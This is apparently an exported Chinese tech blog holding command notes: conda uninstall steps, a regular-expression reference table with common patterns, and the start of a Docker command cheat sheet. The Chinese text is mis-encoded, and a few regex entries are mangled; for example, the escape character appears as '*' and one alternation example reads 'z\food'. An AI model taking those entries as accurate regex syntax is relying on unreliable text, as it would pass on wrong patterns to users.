<h3 id="é€€å‡ºç¯å¢ƒ"><a href="#é€€å‡ºç¯å¢ƒ" class="headerlink" title="é€€å‡ºç¯å¢ƒ"></a>é€€å‡ºç¯å¢ƒ</h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda deactivate</span></span><br></pre></td></tr></table></figure>



<h2 id="å¸è½½æ“ä½œ"><a href="#å¸è½½æ“ä½œ" class="headerlink" title="å¸è½½æ“ä½œ"></a>å¸è½½æ“ä½œ</h2><ul>
<li><p>åˆ é™¤å®‰è£…ç›®å½•</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rm -rf <span class="regexp">/usr/</span>local/miniconda</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ é™¤è·¯å¾„å˜é‡ï¼ˆç»ˆç«¯é…ç½®æ–‡ä»¶ï¼‰</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">PATH</span>=<span class="string">&quot;/usr/local/miniconda:<span class="variable">$PATH</span>&quot;</span> </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>venv</tag>
      </tags>
  </entry>
  <entry>
    <title>æ­£åˆ™è¡¨è¾¾å¼æ‰‹å†Œ</title>
    <url>/regex/</url>
    <content><![CDATA[<h2 id="è¡¨è¾¾å¼å…¨é›†"><a href="#è¡¨è¾¾å¼å…¨é›†" class="headerlink" title="è¡¨è¾¾å¼å…¨é›†"></a>è¡¨è¾¾å¼å…¨é›†</h2><table>
<thead>
<tr>
<th align="center">å­—ç¬¦</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>*</strong></td>
<td align="left">å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>n</code>åŒ¹é…å­—ç¬¦<code>n</code>ã€‚<code>\n</code>åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ä¸²è¡Œ<code>\\</code>åŒ¹é…<code>\</code>è€Œ<code>\(</code>åˆ™åŒ¹é…<code>(</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>^</strong></td>
<td align="left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ^ä¹ŸåŒ¹é…<code>\n</code>æˆ–<code>\r</code>ä¹‹åçš„ä½ç½®ã€‚</td>
</tr>
<tr>
<td align="center"><strong>$</strong></td>
<td align="left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ$ä¹ŸåŒ¹é…<code>\n</code>æˆ–<code>\r</code>ä¹‹å‰çš„ä½ç½®ã€‚</td>
</tr>
<tr>
<td align="center"><strong>*</strong></td>
<td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo<em>èƒ½åŒ¹é…<code>z</code>ä»¥åŠ<code>zoo</code>ã€‚</em>ç­‰ä»·äº{0,}ã€‚</td>
</tr>
<tr>
<td align="center"><strong>+</strong></td>
<td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>zo+</code>èƒ½åŒ¹é…<code>zo</code>ä»¥åŠ<code>zoo</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>z</code>ã€‚+ç­‰ä»·äº{1,}ã€‚</td>
</tr>
<tr>
<td align="center"><strong>?</strong></td>
<td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>do(es)?</code>å¯ä»¥åŒ¹é…<code>does</code>æˆ–<code>does</code>ä¸­çš„<code>do</code>ã€‚?ç­‰ä»·äº{0,1}ã€‚</td>
</tr>
<tr>
<td align="center"><strong>{<em>n</em>}</strong></td>
<td align="left"><em>n</em>æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„<em>n</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>o&#123;2&#125;</code>ä¸èƒ½åŒ¹é…<code>Bob</code>ä¸­çš„<code>o</code>ï¼Œä½†æ˜¯èƒ½åŒ¹é…<code>food</code>ä¸­çš„ä¸¤ä¸ªoã€‚</td>
</tr>
<tr>
<td align="center"><strong>{<em>n</em>,}</strong></td>
<td align="left"><em>n</em>æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…<em>n</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>o&#123;2,&#125;</code>ä¸èƒ½åŒ¹é…<code>Bob</code>ä¸­çš„<code>o</code>ï¼Œä½†èƒ½åŒ¹é…<code>foooood</code>ä¸­çš„æ‰€æœ‰oã€‚<code>o&#123;1,&#125;</code>ç­‰ä»·äº<code>o+</code>ã€‚<code>o&#123;0,&#125;</code>åˆ™ç­‰ä»·äº<code>o*</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>{<em>n</em>,<em>m</em>}</strong></td>
<td align="left"><em>m</em>å’Œ<em>n</em>å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­<em>n</em>&lt;&#x3D;*m*ã€‚æœ€å°‘åŒ¹é…*n*æ¬¡ä¸”æœ€å¤šåŒ¹é…*m*æ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>o&#123;1,3&#125;</code>å°†åŒ¹é…<code>fooooood</code>ä¸­çš„å‰ä¸‰ä¸ªoã€‚<code>o&#123;0,1&#125;</code>ç­‰ä»·äº<code>o?</code>ã€‚<br />è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td>
</tr>
<tr>
<td align="center"><strong>?</strong></td>
<td align="left">å½“è¯¥å­—ç¬¦ç´§è·Ÿåœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–é™åˆ¶ç¬¦ï¼ˆ*,+,?ï¼Œ{<em>n</em>}ï¼Œ{<em>n</em>,}ï¼Œ{<em>n</em>,<em>m</em>}ï¼‰åé¢æ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯éè´ªå©ªçš„ã€‚<br />éè´ªå©ªæ¨¡å¼å°½å¯èƒ½å°‘çš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„è´ªå©ªæ¨¡å¼åˆ™å°½å¯èƒ½å¤šçš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå­—ç¬¦ä¸²<code>oooo</code>ï¼Œ<code>o+?</code>å°†åŒ¹é…å•ä¸ª<code>o</code>ï¼Œè€Œ<code>o+</code>å°†åŒ¹é…æ‰€æœ‰<code>o</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>.</strong></td>
<td align="left">åŒ¹é…é™¤<code>\n</code>ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬<code>\*n</code>*åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨åƒ<code>(.|\n)</code>çš„æ¨¡å¼ã€‚</td>
</tr>
<tr>
<td align="center"><strong>(pattern)</strong></td>
<td align="left">åŒ¹é…patternå¹¶è·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€è·å–çš„åŒ¹é…å¯ä»¥ä»äº§ç”Ÿçš„Matchesé›†åˆå¾—åˆ°ï¼Œåœ¨VBScriptä¸­ä½¿ç”¨SubMatchesé›†åˆï¼Œåœ¨JScriptä¸­åˆ™ä½¿ç”¨$0â€¦$9å±æ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨<code>\(</code>æˆ–<code>\)</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>(?:pattern)</strong></td>
<td align="left">åŒ¹é…patternä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨æˆ–å­—ç¬¦<code>(|)</code>æ¥ç»„åˆä¸€ä¸ªæ¨¡å¼çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¾ˆæœ‰ç”¨ã€‚<br />ä¾‹å¦‚ï¼Œ<code>industr(?:y|ies)</code>å°±æ˜¯ä¸€ä¸ªæ¯”<code>industry|industries</code>æ›´ç®€ç•¥çš„è¡¨è¾¾å¼ã€‚</td>
</tr>
<tr>
<td align="center"><strong>(?&#x3D;pattern)</strong></td>
<td align="left">æ­£å‘è‚¯å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚<br />ä¾‹å¦‚ï¼Œ<code>Windows(?=95|98|NT|2000)</code>èƒ½åŒ¹é…<code>Windows2000</code>ä¸­çš„<code>Windows</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>Windows3.1</code>ä¸­çš„<code>Windows</code>ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”Ÿåï¼Œåœ¨æœ€åä¸€æ¬¡åŒ¹é…ä¹‹åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»åŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åå¼€å§‹ã€‚</td>
</tr>
<tr>
<td align="center"><strong>(?!pattern)</strong></td>
<td align="left">æ­£å‘å¦å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚<br />ä¾‹å¦‚ï¼Œ<code>Windows(?!95|98|NT|2000)</code>èƒ½åŒ¹é…<code>Windows3.1</code>ä¸­çš„<code>Windows</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>Windows2000</code>ä¸­çš„<code>Windows</code>ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”Ÿåï¼Œåœ¨æœ€åä¸€æ¬¡åŒ¹é…ä¹‹åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»åŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åå¼€å§‹ã€‚</td>
</tr>
<tr>
<td align="center"><strong>(?&lt;&#x3D;pattern)</strong></td>
<td align="left">åå‘è‚¯å®šé¢„æŸ¥ï¼Œä¸æ­£å‘è‚¯å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚<br />ä¾‹å¦‚ï¼Œ<code>(?&lt;=95|98|NT|2000)Windows</code>èƒ½åŒ¹é…<code>2000Windows</code>ä¸­çš„<code>Windows</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>3.1Windows</code>ä¸­çš„<code>Windows</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>(?&lt;!pattern)</strong></td>
<td align="left">åå‘å¦å®šé¢„æŸ¥ï¼Œä¸æ­£å‘å¦å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚<br />ä¾‹å¦‚ï¼Œ<code>(?&lt;!95|98|NT|2000)Windows</code>èƒ½åŒ¹é…<code>3.1Windows</code>ä¸­çš„<code>Windows</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>2000Windows</code>ä¸­çš„<code>Windows</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>x|y</strong></td>
<td align="left">åŒ¹é…xæˆ–yã€‚<br />ä¾‹å¦‚ï¼Œ<code>z\food</code>èƒ½åŒ¹é…<code>z</code>æˆ–<code>food</code>ã€‚<code>(z|f)ood</code>åˆ™åŒ¹é…<code>zood</code>æˆ–<code>food</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>[xyz]</strong></td>
<td align="left">å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br />ä¾‹å¦‚ï¼Œ<code>[abc]</code>å¯ä»¥åŒ¹é…<code>plain</code>ä¸­çš„<code>a</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>[^xyz]</strong></td>
<td align="left">è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚<br />ä¾‹å¦‚ï¼Œ<code>[^abc]</code>å¯ä»¥åŒ¹é…<code>plain</code>ä¸­çš„<code>p</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>[a-z]</strong></td>
<td align="left">å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚<br />ä¾‹å¦‚ï¼Œ<code>[a-z]</code>å¯ä»¥åŒ¹é…<code>a</code>åˆ°<code>z</code>èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center"><strong>[^a-z]</strong></td>
<td align="left">è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚<br />ä¾‹å¦‚ï¼Œ<code>[^a-z]</code>å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨<code>a</code>åˆ°<code>z</code>èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\b</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚<br />ä¾‹å¦‚ï¼Œ<code>er\b</code>å¯ä»¥åŒ¹é…<code>never</code>ä¸­çš„<code>er</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>verb</code>ä¸­çš„<code>er</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\B</strong></td>
<td align="left">åŒ¹é…éå•è¯è¾¹ç•Œã€‚<code>er\B</code>èƒ½åŒ¹é…<code>verb</code>ä¸­çš„<code>er</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>never</code>ä¸­çš„<code>er</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\cx</strong></td>
<td align="left">åŒ¹é…ç”±xæŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\cMåŒ¹é…ä¸€ä¸ªControl-Mæˆ–å›è½¦ç¬¦ã€‚xçš„å€¼å¿…é¡»ä¸ºA-Zæˆ–a-zä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°†cè§†ä¸ºä¸€ä¸ªåŸä¹‰çš„<code>c</code>å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\d</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[0-9]ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\D</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[^0-9]ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\f</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº\x0cå’Œ\cLã€‚</td>
</tr>
<tr>
<td align="center"><strong>\n</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº\x0aå’Œ\cJã€‚</td>
</tr>
<tr>
<td align="center"><strong>\r</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº\x0då’Œ\cMã€‚</td>
</tr>
<tr>
<td align="center"><strong>\s</strong></td>
<td align="left">åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº[ \f\n\r\t\v]ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\S</strong></td>
<td align="left">åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº[^ \f\n\r\t\v]ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\t</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x09å’Œ\cIã€‚</td>
</tr>
<tr>
<td align="center"><strong>\v</strong></td>
<td align="left">åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x0bå’Œ\cKã€‚</td>
</tr>
<tr>
<td align="center"><strong>\w</strong></td>
<td align="left">åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚ç­‰ä»·äº<code>[A-Za-z0-9_]</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\W</strong></td>
<td align="left">åŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ã€‚ç­‰ä»·äº<code>[^A-Za-z0-9_]</code>ã€‚</td>
</tr>
<tr>
<td align="center"><strong>\x<em>n</em></strong></td>
<td align="left">åŒ¹é…<em>n</em>ï¼Œå…¶ä¸­<em>n</em>ä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œ<code>\x41</code>åŒ¹é…<code>A</code>ã€‚<code>\x041</code>åˆ™ç­‰ä»·äº<code>\x04&amp;1</code>ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ASCIIç¼–ç ã€‚.</td>
</tr>
<tr>
<td align="center"><strong>*num</strong>*</td>
<td align="left">åŒ¹é…<em>num</em>ï¼Œå…¶ä¸­<em>num</em>æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€è·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚<br />ä¾‹å¦‚ï¼Œ<code>(.)\1</code>åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚</td>
</tr>
<tr>
<td align="center"><strong>*n</strong>*</td>
<td align="left">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚<br />å¦‚æœ*n<em>ä¹‹å‰è‡³å°‘</em>n<em>ä¸ªè·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™</em>n<em>ä¸ºå‘åå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœ</em>n<em>ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™</em>n*ä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚</td>
</tr>
<tr>
<td align="center"><strong>*nm</strong>*</td>
<td align="left">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚<br />å¦‚æœ*nm<em>ä¹‹å‰è‡³å°‘æœ‰</em>nm<em>ä¸ªè·å¾—å­è¡¨è¾¾å¼ï¼Œåˆ™</em>nm<em>ä¸ºå‘åå¼•ç”¨ã€‚å¦‚æœ*nm</em>ä¹‹å‰è‡³å°‘æœ‰<em>n</em>ä¸ªè·å–ï¼Œåˆ™<em>n</em>ä¸ºä¸€ä¸ªåè·Ÿæ–‡å­—<em>m</em>çš„å‘åå¼•ç”¨ã€‚å¦‚æœå‰é¢çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè‹¥<em>n</em>å’Œ<em>m</em>å‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™*nm<em>å°†åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼</em>nm*ã€‚</td>
</tr>
<tr>
<td align="center"><strong>*nml</strong>*</td>
<td align="left">å¦‚æœ<em>n</em>ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-3ï¼‰ï¼Œä¸”<em>må’Œl</em>å‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼<em>nm</em>lã€‚</td>
</tr>
<tr>
<td align="center"><strong>\u<em>n</em></strong></td>
<td align="left">åŒ¹é…<em>n</em>ï¼Œå…¶ä¸­<em>n</em>æ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„Unicodeå­—ç¬¦ã€‚<br />ä¾‹å¦‚ï¼Œ\u00A9åŒ¹é…ç‰ˆæƒç¬¦å·ï¼ˆÂ©ï¼‰ã€‚</td>
</tr>
</tbody></table>
<h2 id="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"><a href="#å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼"></a>å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼</h2><table>
<thead>
<tr>
<th align="left">ç±»å‹</th>
<th>regex</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ç”¨æˆ·å</td>
<td>&#x2F;^[a-z0-9_-]{3,16}$&#x2F;</td>
</tr>
<tr>
<td align="left">å¯†ç </td>
<td>&#x2F;^[a-z0-9_-]{6,18}$&#x2F;</td>
</tr>
<tr>
<td align="left">åå…­è¿›åˆ¶å€¼</td>
<td>&#x2F;^#?([a-f0-9]{6}|[a-f0-9]{3})$&#x2F;</td>
</tr>
<tr>
<td align="left">ç”µå­é‚®ç®±</td>
<td>&#x2F;^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$&#x2F; &#x2F;^[a-z\d]+(.[a-z\d]+)*@(<a href="-%5B%5Cda-z%5D">\da-z</a>?)+(.{1,2}[a-z]+)+$&#x2F;</td>
</tr>
<tr>
<td align="left">URL</td>
<td>&#x2F;^(https?://)?([\da-z.-]+).([a-z.]{2,6})([/\w .-]*)*/?$&#x2F;</td>
</tr>
<tr>
<td align="left">IP åœ°å€</td>
<td>&#x2F;((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)&#x2F; &#x2F;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&#x2F;</td>
</tr>
<tr>
<td align="left">HTML æ ‡ç­¾</td>
<td>&#x2F;^&lt;([a-z]+)([^&lt;]+)<em>(?:&gt;(.</em>)&lt;/\1&gt;|\s+/&gt;)$&#x2F;</td>
</tr>
<tr>
<td align="left">åˆ é™¤ä»£ç \æ³¨é‡Š</td>
<td>(?&lt;!http:|\S)&#x2F;&#x2F;.*$</td>
</tr>
<tr>
<td align="left">Unicodeç¼–ç ä¸­çš„æ±‰å­—èŒƒå›´</td>
<td>&#x2F;^[\u2E80-\u9FFF]+$&#x2F;</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>regex</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker å‘½ä»¤</title>
    <url>/docker/</url>
    <content><![CDATA[<h2 id="æºé…ç½®"><a href="#æºé…ç½®" class="headerlink" title="æºé…ç½®"></a>æºé…ç½®</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;https://registry.docker-cn.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="å¸®åŠ©å‘½ä»¤"><a href="#å¸®åŠ©å‘½ä»¤" class="headerlink" title="å¸®åŠ©å‘½ä»¤"></a>å¸®åŠ©å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version		<span class="comment"># ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">docker info		<span class="comment"># ç³»ç»Ÿä¿¡æ¯</span></span><br><span class="line">docker &lt;order&gt; --<span class="built_in">help</span>	<span class="comment"># å¸®åŠ©å‘½ä»¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å®¹å™¨æœ€å10æ¡æ—¥å¿—</span></span><br><span class="line">docker logs -f -t --<span class="built_in">tail</span> 10 &lt;container&gt;</span><br></pre></td></tr></table></figure>



<h2 id="æ’é”™å‘½ä»¤"><a href="#æ’é”™å‘½ä»¤" class="headerlink" title="æ’é”™å‘½ä»¤"></a>æ’é”™å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ å®¹å™¨ æ—¥å¿—</span></span><br><span class="line">docker logs &lt;container&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å®¹å™¨ æŒ‚è½½ç«¯å£æ˜ å°„ç­‰ä¿¡æ¯</span></span><br><span class="line">docker inspect &lt;container&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å®¹å™¨ ç«¯å£æ˜ å°„</span></span><br><span class="line">docker port &lt;container&gt;</span><br></pre></td></tr></table></figure>



<h2 id="é•œåƒå‘½ä»¤"><a href="#é•œåƒå‘½ä»¤" class="headerlink" title="é•œåƒå‘½ä»¤"></a>é•œåƒå‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images			<span class="comment"># æŸ¥çœ‹é•œåƒ</span></span><br><span class="line">docker images -aq		<span class="comment"># åªæ˜¾ç¤ºé•œåƒID</span></span><br><span class="line">docker search &lt;image&gt;		<span class="comment"># æœç´¢é•œåƒ</span></span><br><span class="line">docker pull &lt;image&gt;		<span class="comment"># ä¸‹è½½é•œåƒ</span></span><br><span class="line">docker rmi -f &lt;image&gt;		<span class="comment"># åˆ é™¤é•œåƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨é•œåƒ</span></span><br><span class="line">docker rmi -f $(docker images -aq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># commit é•œåƒ</span></span><br><span class="line">docker commit  -m=<span class="string">&#x27;æè¿°ä¿¡æ¯&#x27;</span> -a=<span class="string">&#x27;ä½œè€…&#x27;</span> å®¹å™¨<span class="built_in">id</span> ç›®æ ‡é•œåƒå</span><br><span class="line"></span><br><span class="line"><span class="comment"># é•œåƒé‡å‘½å</span></span><br><span class="line">docker tag local-image:tagname new-repo:tagname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 